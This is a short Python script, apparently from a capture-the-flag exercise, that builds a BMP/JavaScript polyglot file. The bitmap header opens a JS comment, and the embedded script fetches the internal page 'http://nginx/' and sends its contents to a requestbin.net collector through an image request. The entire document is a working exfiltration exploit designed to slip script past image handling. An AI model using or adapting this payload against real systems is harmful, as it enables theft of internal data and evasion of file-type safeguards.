HEADER = b'\x42\x4D\x2F\x2A\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\x00\x00\x32\x00\x00\x00\x32\x00\x00\x00\x01\x00\x18\x00\x00\x00\x00\x00\xB0\x1D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
SCRIPT = b'''*/=1;
path="http://nginx/";
x=new XMLHttpRequest();
x.open('GET', path, false);
x.send(null);
(new Image).src = 'http://requestbin.net/r/18a2by31?hoge=' + encodeURIComponent(x.responseText);
/*'''.replace(b"\n", b"")

with open('result.bmp', 'wb') as f:
    f.write(HEADER)
    f.write(SCRIPT)
    f.write(b'A' * (7652 - (len(HEADER) + len(SCRIPT))) + b'*/')
